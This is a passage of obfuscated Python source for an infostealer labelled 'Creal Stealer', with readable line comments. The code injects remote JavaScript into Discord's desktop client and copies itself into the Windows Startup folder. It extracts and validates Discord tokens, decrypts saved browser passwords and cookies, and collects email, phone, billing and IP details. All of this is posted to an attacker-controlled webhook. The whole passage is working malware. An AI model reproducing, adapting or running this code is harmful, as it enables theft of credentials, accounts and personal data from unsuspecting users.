                            for OO0OOO00OOOO0O000 ,OOO00O00O0O0O0O00 ,O0O0O00O0O000O0OO in os .walk (O0O0OOOO0OOO00OOO ):#line:259:for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-'in OO0OOO00OOOO0O000 :#line:260:if 'discord_desktop_core-' in subsubdir:
                                    for O00OO000000O00OOO ,O0O00OOOOO0OOOO00 ,O0O0O00OOO00OOOO0 in os .walk (OO0OOO00OOOO0O000 ):#line:261:for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core'in O00OO000000O00OOO :#line:262:if 'discord_desktop_core' in subsubsubdir:
                                            for O0OO0O000OO00OO00 in O0O0O00OOO00OOOO0 :#line:263:for file in subsubfiles:
                                                if O0OO0O000OO00OO00 =='index.js':#line:264:if file == 'index.js':
                                                    OO0OO00OOO0OOO00O =os .path .join (O00OO000000O00OOO ,O0OO0O000OO00OO00 )#line:265:file_path = os.path.join(subsubsubdir, file)
                                                    O0OOO0O00O0OOOOOO =requests .get (inj_url ).text #line:267:inj_content = requests.get(inj_url).text
                                                    O0OOO0O00O0OOOOOO =O0OOO0O00O0OOOOOO .replace ("%WEBHOOK%",wh00k )#line:269:inj_content = inj_content.replace("%WEBHOOK%", wh00k)
                                                    with open (OO0OO00OOO0OOO00O ,"w",encoding ="utf-8")as OOO0O0O0O0O0OO0OO :#line:271:with open(file_path, "w", encoding="utf-8") as index_file:
                                                        OOO0O0O0O0O0OO0OO .write (O0OOO0O00O0OOOOOO )#line:272:index_file.write(inj_content)
inj_discord ()#line:273:inj_discord()
def G3tB4dg31 (O00OO0OOO0O00000O ):#line:275:def G3tB4dg31(flags):
    if O00OO0OOO0O00000O ==0 :return ''#line:276:if flags == 0: return ''
    OO0OOOOOOOO0O0000 =''#line:278:Own3dB3dg4s = ''
    OO0OO000OO0O000O0 =[{"Name":'Early_Verified_Bot_Developer','Value':131072 ,'Emoji':"<:developer:874750808472825986> "},{"Name":'Bug_Hunter_Level_2','Value':16384 ,'Emoji':"<:bughunter_2:874750808430874664> "},{"Name":'Early_Supporter','Value':512 ,'Emoji':"<:early_supporter:874750808414113823> "},{"Name":'House_Balance','Value':256 ,'Emoji':"<:balance:874750808267292683> "},{"Name":'House_Brilliance','Value':128 ,'Emoji':"<:brilliance:874750808338608199> "},{"Name":'House_Bravery','Value':64 ,'Emoji':"<:bravery:874750808388952075> "},{"Name":'Bug_Hunter_Level_1','Value':8 ,'Emoji':"<:bughunter_1:874750808426692658> "},{"Name":'HypeSquad_Events','Value':4 ,'Emoji':"<:hypesquad_events:874750808594477056> "},{"Name":'Partnered_Server_Owner','Value':2 ,'Emoji':"<:partner:874750808678354964> "},{"Name":'Discord_Employee','Value':1 ,'Emoji':"<:staff:874750808728666152> "}]#line:290:]
    for O00O0O00O0OO0O000 in OO0OO000OO0O000O0 :#line:291:for b4dg3 in b4dg3List:
        if O00OO0OOO0O00000O //O00O0O00O0OO0O000 ["Value"]!=0 :#line:292:if flags // b4dg3["Value"] != 0:
            OO0OOOOOOOO0O0000 +=O00O0O00O0OO0O000 ["Emoji"]#line:293:Own3dB3dg4s += b4dg3["Emoji"]
            O00OO0OOO0O00000O =O00OO0OOO0O00000O %O00O0O00O0OO0O000 ["Value"]#line:294:flags = flags % b4dg3["Value"]
    return OO0OOOOOOOO0O0000 #line:296:return Own3dB3dg4s
def G3tT0k4n1nf9 (OO000O0OO00O0OO0O ):#line:298:def G3tT0k4n1nf9(t0k3n):
    O00O000OO0OOOOOOO ={"Authorization":OO000O0OO00O0OO0O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:303:}
    O000OO0OOOOO0O000 =loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O00O000OO0OOOOOOO )).read ().decode ())#line:305:us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    OO0O00O0OOO0OO0OO =O000OO0OOOOO0O000 ["username"]#line:306:us3rn4m1 = us3rjs0n["username"]
    OO0OO0OOO0O0OO000 =O000OO0OOOOO0O000 ["discriminator"]#line:307:hashtag = us3rjs0n["discriminator"]
    OOO0OOOO000O0O0OO =O000OO0OOOOO0O000 ["email"]#line:308:em31l = us3rjs0n["email"]
    O0O0OO0OO00O0O00O =O000OO0OOOOO0O000 ["id"]#line:309:idd = us3rjs0n["id"]
    OOOOO000OOO00000O =O000OO0OOOOO0O000 ["avatar"]#line:310:pfp = us3rjs0n["avatar"]
    O000000O000OO0O00 =O000OO0OOOOO0O000 ["public_flags"]#line:311:flags = us3rjs0n["public_flags"]
    O0OO0OO0OOO00OO00 =""#line:312:n1tr0 = ""
    OO0OO0OOO0000O000 =""#line:313:ph0n3 = ""
    if "premium_type"in O000OO0OOOOO0O000 :#line:315:if "premium_type" in us3rjs0n:
        O00OO0O0OO00OOO00 =O000OO0OOOOO0O000 ["premium_type"]#line:316:nitrot = us3rjs0n["premium_type"]
        if O00OO0O0OO00OOO00 ==1 :#line:317:if nitrot == 1:
            O0OO0OO0OOO00OO00 ="<a:DE_BadgeNitro:865242433692762122>"#line:318:n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif O00OO0O0OO00OOO00 ==2 :#line:319:elif nitrot == 2:
            O0OO0OO0OOO00OO00 ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:320:n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3"in O000OO0OOOOO0O000 :OO0OO0OOO0000O000 =f'{O000OO0OOOOO0O000["ph0n3"]}'#line:321:if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'
    return OO0O00O0OOO0OO0OO ,OO0OO0OOO0O0OO000 ,OOO0OOOO000O0O0OO ,O0O0OO0OO00O0O00O ,OOOOO000OOO00000O ,O000000O000OO0O00 ,O0OO0OO0OOO00OO00 ,OO0OO0OOO0000O000 #line:323:return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3
def ch1ckT4k1n (O0000O0O00OO0O00O ):#line:325:def ch1ckT4k1n(t0k3n):
    OO000OOO00OO0OO00 ={"Authorization":O0000O0O00OO0O00O ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:330:}
    try :#line:331:try:
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =OO000OOO00OO0OO00 ))#line:332:urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True #line:333:return True
    except :#line:334:except:
        return False #line:335:return False
if getattr (sys ,'frozen',False ):#line:337:if getattr(sys, 'frozen', False):
    currentFilePath =os .path .dirname (sys .executable )#line:338:currentFilePath = os.path.dirname(sys.executable)
else :#line:339:else:
    currentFilePath =os .path .dirname (os .path .abspath (__file__ ))#line:340:currentFilePath = os.path.dirname(os.path.abspath(__file__))
fileName =os .path .basename (sys .argv [0 ])#line:342:fileName = os.path.basename(sys.argv[0])
filePath =os .path .join (currentFilePath ,fileName )#line:343:filePath = os.path.join(currentFilePath, fileName)
startupFolderPath =os .path .join (os .path .expanduser ('~'),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')#line:345:startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath =os .path .join (startupFolderPath ,fileName )#line:346:startupFilePath = os.path.join(startupFolderPath, fileName)
if os .path .abspath (filePath ).lower ()!=os .path .abspath (startupFilePath ).lower ():#line:348:if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open (filePath ,'rb')as src_file ,open (startupFilePath ,'wb')as dst_file :#line:349:with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil .copyfileobj (src_file ,dst_file )#line:350:shutil.copyfileobj(src_file, dst_file)
def upl05dT4k31 (OO000O0O0OO0OOOOO ,OOO0OO00OO0OOO000 ):#line:353:def upl05dT4k31(t0k3n, path):
    global wh00k #line:354:global wh00k
    O000OO0000O0O00OO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:358:}
    OO00OO0O0000O000O ,O00OO0000OO0OO00O ,O000O0OO0OOO00O00 ,O000000OO0O0000OO ,OOOO0O0OO0O00000O ,OO00OO0OOOOOO0O00 ,OO0000OO0O0000000 ,O0000O000O0OO0OOO =G3tT0k4n1nf9 (OO000O0O0OO0OOOOO )#line:359:us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
    if OOOO0O0OO0O00000O ==None :#line:361:if pfp == None:
        OOOO0O0OO0O00000O ="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"#line:362:pfp = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
    else :#line:363:else:
        OOOO0O0OO0O00000O =f"https://cdn.discordapp.com/avatars/{O000000OO0O0000OO}/{OOOO0O0OO0O00000O}"#line:364:pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
    OO0OOOOO0OOO0000O =G3tb1ll1ng (OO000O0O0OO0OOOOO )#line:366:b1ll1ng = G3tb1ll1ng(t0k3n)
    O000OO00OOO0O0OO0 =G3tB4dg31 (OO00OO0OOOOOO0O00 )#line:367:b4dg3 = G3tB4dg31(flags)
    O0O0OO00000OO0000 =G3tUHQFr13ndS (OO000O0O0OO0OOOOO )#line:368:friends = G3tUHQFr13ndS(t0k3n)
    if O0O0OO00000OO0000 =='':O0O0OO00000OO0000 ="```No Rare Friends```"#line:369:if friends == '': friends = "```No Rare Friends```"
    if not OO0OOOOO0OOO0000O :#line:370:if not b1ll1ng:
        O000OO00OOO0O0OO0 ,O0000O000O0OO0OOO ,OO0OOOOO0OOO0000O ="🔒","🔒","🔒"#line:371:b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if OO0000OO0O0000000 ==''and O000OO00OOO0O0OO0 =='':OO0000OO0O0000000 ="```None```"#line:372:if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"
    OOO0OOOO0OO0O00O0 ={"content":f'{globalInfo()} | `{OOO0OO00OO0OOO000}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{OO000O0O0OO0OOOOO}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{O000O0OO0OOO00O00}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{O0000O000O0OO0OOO}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{OO0000OO0O0000000}{O000OO00OOO0O0OO0}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{OO0OOOOO0OOO0000O}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{O0O0OO00000OO0000}","inline":False }],"author":{"name":f"{OO00OO0O0000O000O}#{O00OO0000OO0OO00O} ({O000000OO0O0000OO})","icon_url":f"{OOOO0O0OO0O00000O}"},"footer":{"text":"Creal Stealer","icon_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"},"thumbnail":{"url":f"{OOOO0O0OO0O00000O}"}}],"avatar_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg","username":"Creal Stealer","attachments":[]}#line:432:}
    L04durl1b (wh00k ,data =dumps (OOO0OOOO0OO0O00O0 ).encode (),headers =O000OO0000O0O00OO )#line:433:L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
def R4f0rm3t (OOO0O00000OO000OO ):#line:436:def R4f0rm3t(listt):
    O0O000OOOOO0O0O0O =re .findall ("(\w+[a-z])",OOO0O00000OO000OO )#line:437:e = re.findall("(\w+[a-z])",listt)
    while "https"in O0O000OOOOO0O0O0O :O0O000OOOOO0O0O0O .remove ("https")#line:438:while "https" in e: e.remove("https")
    while "com"in O0O000OOOOO0O0O0O :O0O000OOOOO0O0O0O .remove ("com")#line:439:while "com" in e: e.remove("com")
    while "net"in O0O000OOOOO0O0O0O :O0O000OOOOO0O0O0O .remove ("net")#line:440:while "net" in e: e.remove("net")
    return list (set (O0O000OOOOO0O0O0O ))#line:441:return list(set(e))
def upload (OO000O000OO00OO0O ,OO0O00OO0O00000OO ):#line:443:def upload(name, link):
    OO000000O0O00000O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:447:}
    if OO000O000OO00OO0O =="crcook":#line:449:if name == "crcook":
        O0OOOOOO000OO0OOO =' | '.join (OO0O0OOO00OO0O0O0 for OO0O0OOO00OO0O0O0 in cookiWords )#line:450:rb = ' | '.join(da for da in cookiWords)
        if len (O0OOOOOO000OO0OOO )>1000 :#line:451:if len(rb) > 1000:
            OO0OO0OO000000OOO =R4f0rm3t (str (cookiWords ))#line:452:rrrrr = R4f0rm3t(str(cookiWords))
            O0OOOOOO000OO0OOO =' | '.join (O000OO0OOOOOO000O for O000OO0OOOOOO000O in OO0OO0OO000000OOO )#line:453:rb = ' | '.join(da for da in rrrrr)
        O00OOO0000000O000 ={"content":f"{globalInfo()}","embeds":[{"title":"Creal | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{O0OOOOOO000OO0OOO}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({OO0O00OO0O00000OO})","color":2895667 ,"footer":{"text":"Creal Stealer","icon_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"}}],"username":"Creal Stealer","avatar_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg","attachments":[]}#line:470:}
        L04durl1b (wh00k ,data =dumps (O00OOO0000000O000 ).encode (),headers =OO000000O0O00000O )#line:471:L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return #line:472:return
    if OO000O000OO00OO0O =="crpassw":#line:474:if name == "crpassw":
        OOOOO0000O0O0O0OO =' | '.join (O0OOO0O000O00O0O0 for O0OOO0O000O00O0O0 in paswWords )#line:475:ra = ' | '.join(da for da in paswWords)
        if len (OOOOO0000O0O0O0OO )>1000 :#line:476:if len(ra) > 1000:
            O0OO0OOO0000O0OOO =R4f0rm3t (str (paswWords ))#line:477:rrr = R4f0rm3t(str(paswWords))
            OOOOO0000O0O0O0OO =' | '.join (O0OOO0O0O000OOO0O for O0OOO0O0O000OOO0O in O0OO0OOO0000O0OOO )#line:478:ra = ' | '.join(da for da in rrr)
        O00OOO0000000O000 ={"content":f"{globalInfo()}","embeds":[{"title":"Creal | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OOOOO0000O0O0O0OO}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({OO0O00OO0O00000OO})","color":2895667 ,"footer":{"text":"Creal Stealer","icon_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"}}],"username":"Creal","avatar_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg","attachments":[]}#line:496:}
        L04durl1b (wh00k ,data =dumps (O00OOO0000000O000 ).encode (),headers =OO000000O0O00000O )#line:497:L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return #line:498:return
    if OO000O000OO00OO0O =="kiwi":#line:500:if name == "kiwi":
        O00OOO0000000O000 ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":OO0O00OO0O00000OO }],"author":{"name":"Creal | File Stealer"},"footer":{"text":"Creal Stealer","icon_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"}}],"username":"Creal Stealer","avatar_url":"https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg","attachments":[]}#line:524:}
        L04durl1b (wh00k ,data =dumps (O00OOO0000000O000 ).encode (),headers =OO000000O0O00000O )#line:525:L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return #line:526:return
def wr1tef0rf1l3 (O0O0O00OO00OOOOO0 ,OO000O0O0OOOO0000 ):#line:535:def wr1tef0rf1l3(data, name):
    O0O00O0O0OO0O0O0O =os .getenv ("TEMP")+f"\cr{OO000O0O0OOOO0000}.txt"#line:536:path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open (O0O00O0O0OO0O0O0O ,mode ='w',encoding ='utf-8')as OOO0000OO0OO0O0OO :#line:537:with open(path, mode='w', encoding='utf-8') as f:
        OOO0000OO0OO0O0OO .write (f"<--Creal STEALER BEST -->\n\n")#line:538:f.write(f"<--Creal STEALER BEST -->\n\n")
        for O00O00OOO0O0O00O0 in O0O0O00OO00OOOOO0 :#line:539:for line in data:
            if O00O00OOO0O0O00O0 [0 ]!='':#line:540:if line[0] != '':
                OOO0000OO0OO0O0OO .write (f"{O00O00OOO0O0O00O0}\n")#line:541:f.write(f"{line}\n")
T0k3ns =''#line:543:T0k3ns = ''
def getT0k3n (OOOOOO00OOOOOO0OO ,O0O0O00000OO0O000 ):#line:544:def getT0k3n(path, arg):
    if not os .path .exists (OOOOOO00OOOOOO0OO ):return #line:545:if not os.path.exists(path): return
    OOOOOO00OOOOOO0OO +=O0O0O00000OO0O000 #line:547:path += arg
    for O0000O000O00OOOO0 in os .listdir (OOOOOO00OOOOOO0OO ):#line:548:for file in os.listdir(path):
        if O0000O000O00OOOO0 .endswith (".log")or O0000O000O00OOOO0 .endswith (".ldb"):#line:549:if file.endswith(".log") or file.endswith(".ldb")   :
            for OO0OO0O0OOO0O000O in [OOOOO000O0O00OO0O .strip ()for OOOOO000O0O00OO0O in open (f"{OOOOOO00OOOOOO0OO}\\{O0000O000O00OOOO0}",errors ="ignore").readlines ()if OOOOO000O0O00OO0O .strip ()]:#line:550:for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for O0OO00O00O0OO00OO in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:551:for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for OOO0OOOO0000O0000 in re .findall (O0OO00O00O0OO00OO ,OO0OO0O0OOO0O000O ):#line:552:for t0k3n in re.findall(regex, line):
                        global T0k3ns #line:553:global T0k3ns
                        if ch1ckT4k1n (OOO0OOOO0000O0000 ):#line:554:if ch1ckT4k1n(t0k3n):
                            if not OOO0OOOO0000O0000 in T0k3ns :#line:555:if not t0k3n in T0k3ns:
                                T0k3ns +=OOO0OOOO0000O0000 #line:557:T0k3ns += t0k3n
                                upl05dT4k31 (OOO0OOOO0000O0000 ,OOOOOO00OOOOOO0OO )#line:558:upl05dT4k31(t0k3n, path)
P4ssw =[]#line:560:P4ssw = []
def getP4ssw (OOOO000OOO0OOO00O ,OO0O000OOO00000O0 ):#line:561:def getP4ssw(path, arg):
    global P4ssw ,P4sswCount #line:562:global P4ssw, P4sswCount
    if not os .path .exists (OOOO000OOO0OOO00O ):return #line:563:if not os.path.exists(path): return
    O00OO0O00OOO00OOO =OOOO000OOO0OOO00O +OO0O000OOO00000O0 +"/Login Data"#line:565:pathC = path + arg + "/Login Data"
    if os .stat (O00OO0O00OOO00OOO ).st_size ==0 :return #line:566:if os.stat(pathC).st_size == 0: return
    OO0OOOO0O00OOO0O0 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0OOO0O00OO0O00OO in range (8 ))+".db"#line:568:tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil .copy2 (O00OO0O00OOO00OOO ,OO0OOOO0O00OOO0O0 )#line:570:shutil.copy2(pathC, tempfold)
    O0000O0OO00OOO0O0 =sql_connect (OO0OOOO0O00OOO0O0 )#line:571:conn = sql_connect(tempfold)
    O000OO0O0O0O0O00O =O0000O0OO00OOO0O0 .cursor ()#line:572:cursor = conn.cursor()
    O000OO0O0O0O0O00O .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:573:cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    OOOO0O0O0O0OO0O0O =O000OO0O0O0O0O00O .fetchall ()#line:574:data = cursor.fetchall()
    O000OO0O0O0O0O00O .close ()#line:575:cursor.close()
    O0000O0OO00OOO0O0 .close ()#line:576:conn.close()
    os .remove (OO0OOOO0O00OOO0O0 )#line:577:os.remove(tempfold)
    O0OOOOOOO000O0O00 =OOOO000OOO0OOO00O +"/Local State"#line:579:pathKey = path + "/Local State"
    with open (O0OOOOOOO000O0O00 ,'r',encoding ='utf-8')as OO0O000O00OOOO0OO :O0OOO00OOOO0OOO00 =json_loads (OO0O000O00OOOO0OO .read ())#line:580:with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    OOO0OOO0OO0O0000O =b64decode (O0OOO00OOOO0OOO00 ['os_crypt']['encrypted_key'])#line:581:master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    OOO0OOO0OO0O0000O =CryptUnprotectData (OOO0OOO0OO0O0000O [5 :])#line:582:master_key = CryptUnprotectData(master_key[5:])
    for O00000O0O000OOOOO in OOOO0O0O0O0OO0O0O :#line:584:for row in data:
        if O00000O0O000OOOOO [0 ]!='':#line:585:if row[0] != '':
            for OOOOOOOOOOOO0OO0O in keyword :#line:586:for wa in keyword:
                O000000O000OO000O =OOOOOOOOOOOO0OO0O #line:587:old = wa
                if "https"in OOOOOOOOOOOO0OO0O :#line:588:if "https" in wa:
                    OO000OOOOO000OOOO =OOOOOOOOOOOO0OO0O #line:589:tmp = wa
                    OOOOOOOOOOOO0OO0O =OO000OOOOO000OOOO .split ('[')[1 ].split (']')[0 ]#line:590:wa = tmp.split('[')[1].split(']')[0]
                if OOOOOOOOOOOO0OO0O in O00000O0O000OOOOO [0 ]:#line:591:if wa in row[0]:
                    if not O000000O000OO000O in paswWords :paswWords .append (O000000O000OO000O )#line:592:if not old in paswWords: paswWords.append(old)
            P4ssw .append (f"UR1: {O00000O0O000OOOOO[0]} | U53RN4M3: {O00000O0O000OOOOO[1]} | P455W0RD: {D3kryptV4lU3(O00000O0O000OOOOO[2], OOO0OOO0OO0O0000O)}")#line:593:P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount +=1 #line:594:P4sswCount += 1
    wr1tef0rf1l3 (P4ssw ,'passw')#line:595:wr1tef0rf1l3(P4ssw, 'passw')
C00k13 =[]#line:597:C00k13 = []
def getC00k13 (OOOOOOOO00OOOO0OO ,OO00OOOOO0O0OO0OO ):#line:598:def getC00k13(path, arg):
    global C00k13 ,CookiCount #line:599:global C00k13, CookiCount
    if not os .path .exists (OOOOOOOO00OOOO0OO ):return #line:600:if not os.path.exists(path): return
    O00OOOOOO00OOO000 =OOOOOOOO00OOOO0OO +OO00OOOOO0O0OO0OO +"/Cookies"#line:602:pathC = path + arg + "/Cookies"
    if os .stat (O00OOOOOO00OOO000 ).st_size ==0 :return #line:603:if os.stat(pathC).st_size == 0: return
    OOO0OO0OOO0OOO0OO =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OOO00OO0OO00OO0O0 in range (8 ))+".db"#line:605:tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil .copy2 (O00OOOOOO00OOO000 ,OOO0OO0OOO0OOO0OO )#line:607:shutil.copy2(pathC, tempfold)
    O000O0000OO0O0O0O =sql_connect (OOO0OO0OOO0OOO0OO )#line:608:conn = sql_connect(tempfold)
    O0OO000OO00O0OO0O =O000O0000OO0O0O0O .cursor ()#line:609:cursor = conn.cursor()
    O0OO000OO00O0OO0O .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:610:cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    OO00O0OO0O00O0OOO =O0OO000OO00O0OO0O .fetchall ()#line:611:data = cursor.fetchall()
    O0OO000OO00O0OO0O .close ()#line:612:cursor.close()
    O000O0000OO0O0O0O .close ()#line:613:conn.close()
    os .remove (OOO0OO0OOO0OOO0OO )#line:614:os.remove(tempfold)
    O0OO0OOO000O0OOOO =OOOOOOOO00OOOO0OO +"/Local State"#line:616:pathKey = path + "/Local State"
    with open (O0OO0OOO000O0OOOO ,'r',encoding ='utf-8')as OO0OO0O0O0O0O00OO :OOOOOOO0OOO0O0000 =json_loads (OO0OO0O0O0O0O00OO .read ())#line:618:with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    O0O00O0O00O0000OO =b64decode (OOOOOOO0OOO0O0000 ['os_crypt']['encrypted_key'])#line:619:master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    O0O00O0O00O0000OO =CryptUnprotectData (O0O00O0O00O0000OO [5 :])#line:620:master_key = CryptUnprotectData(master_key[5:])
    for O0O00O00O0O000OO0 in OO00O0OO0O00O0OOO :#line:622:for row in data:
        if O0O00O00O0O000OO0 [0 ]!='':#line:623:if row[0] != '':
            for O000OOOO00OO00O0O in keyword :#line:624:for wa in keyword:
                O000O000O000O0O0O =O000OOOO00OO00O0O #line:625:old = wa
                if "https"in O000OOOO00OO00O0O :#line:626:if "https" in wa:
                    O00OOO00O0O000O0O =O000OOOO00OO00O0O #line:627:tmp = wa
                    O000OOOO00OO00O0O =O00OOO00O0O000O0O .split ('[')[1 ].split (']')[0 ]#line:628:wa = tmp.split('[')[1].split(']')[0]
                if O000OOOO00OO00O0O in O0O00O00O0O000OO0 [0 ]:#line:629:if wa in row[0]:
                    if not O000O000O000O0O0O in cookiWords :cookiWords .append (O000O000O000O0O0O )#line:630:if not old in cookiWords: cookiWords.append(old)
            C00k13 .append (f"{O0O00O00O0O000OO0[0]}	TRUE	/	FALSE	2597573456	{O0O00O00O0O000OO0[1]}	{D3kryptV4lU3(O0O00O00O0O000OO0[2], O0O00O0O00O0000OO)}")#line:631:C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount +=1 #line:632:CookiCount += 1
    wr1tef0rf1l3 (C00k13 ,'cook')#line:633:wr1tef0rf1l3(C00k13, 'cook')
def G3tD1sc0rd (OOOO0O00O0OO0O00O ,O00O0000OO00OO00O ):#line:635:def G3tD1sc0rd(path, arg):
    if not os .path .exists (f"{OOOO0O00O0OO0O00O}/Local State"):return #line:636:if not os.path.exists(f"{path}/Local State"): return
    O0O00O000O0OOOOOO =OOOO0O00O0OO0O00O +O00O0000OO00OO00O #line:638:pathC = path + arg
    OO0O00OOO0O00OO0O =OOOO0O00O0OO0O00O +"/Local State"#line:640:pathKey = path + "/Local State"
    with open (OO0O00OOO0O00OO0O ,'r',encoding ='utf-8')as O000OO0O0O0O0OOOO :OOOOOO00OO0OOOO0O =json_loads (O000OO0O0O0O0OOOO .read ())#line:641:with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    O00OOOOOOO0O000O0 =b64decode (OOOOOO00OO0OOOO0O ['os_crypt']['encrypted_key'])#line:642:master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    O00OOOOOOO0O000O0 =CryptUnprotectData (O00OOOOOOO0O000O0 [5 :])#line:643:master_key = CryptUnprotectData(master_key[5:])
    for O00O0O000OOOOO00O in os .listdir (O0O00O000O0OOOOOO ):#line:646:for file in os.listdir(pathC):
        if O00O0O000OOOOO00O .endswith (".log")or O00O0O000OOOOO00O .endswith (".ldb"):#line:648:if file.endswith(".log") or file.endswith(".ldb")   :
            for O00OOO000OOO000O0 in [O0OO00000OO00OOOO .strip ()for O0OO00000OO00OOOO in open (f"{O0O00O000O0OOOOOO}\\{O00O0O000OOOOO00O}",errors ="ignore").readlines ()if O0OO00000OO00OOOO .strip ()]:#line:649:for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for OOO0O0O0OO00O0O00 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O00OOO000OOO000O0 ):#line:650:for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns #line:651:global T0k3ns
                    O0OOO0O0OO00O0O00 =D3kryptV4lU3 (b64decode (OOO0O0O0OO00O0O00 .split ('dQw4w9WgXcQ:')[1 ]),O00OOOOOOO0O000O0 )#line:652:t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n (O0OOO0O0OO00O0O00 ):#line:653:if ch1ckT4k1n(t0k3nDecoded):
                        if not O0OOO0O0OO00O0O00 in T0k3ns :#line:654:if not t0k3nDecoded in T0k3ns:
                            T0k3ns +=O0OOO0O0OO00O0O00 #line:656:T0k3ns += t0k3nDecoded
